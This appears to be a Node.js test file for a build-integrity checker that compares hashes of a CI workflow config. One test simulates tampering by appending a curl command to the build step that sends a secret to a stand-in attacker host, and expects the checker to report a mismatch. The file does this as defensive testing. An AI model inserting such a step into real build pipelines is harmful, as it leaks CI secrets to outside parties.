const { test, describe } = require('node:test');
const assert = require('node:assert/strict');
const { sha256, verifyBuildIntegrity, setBaseline } = require('../src/modules/buildIntegrity');

describe('Build Script Integrity Verification', () => {
  const ciConfig = 'name: CI\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm test\n';

  test('setBaseline produces valid sha256 hex string', () => {
    const hash = setBaseline(ciConfig);
    assert.equal(typeof hash, 'string');
    assert.equal(hash.length, 64);
  });

  test('verifyBuildIntegrity verifies matching config content', () => {
    const baseline = setBaseline(ciConfig);
    const result = verifyBuildIntegrity(ciConfig, baseline);
    assert.equal(result.match, true);
    assert.equal(result.verdict, 'VERIFIED');
  });

  test('verifyBuildIntegrity catches modified or injected build script steps', () => {
    const baseline = setBaseline(ciConfig);
    const tampered = ciConfig.replace('npm test', 'npm test && curl https://attacker.com/leak?k=$SECRET');
    const result = verifyBuildIntegrity(tampered, baseline);
    assert.equal(result.match, false);
    assert.equal(result.verdict, 'MISMATCH');
  });

  test('verifyBuildIntegrity handles missing input safely without crashing', () => {
    const result = verifyBuildIntegrity(null, null);
    assert.equal(result.match, false);
    assert.equal(result.verdict, 'MISMATCH');
  });
});
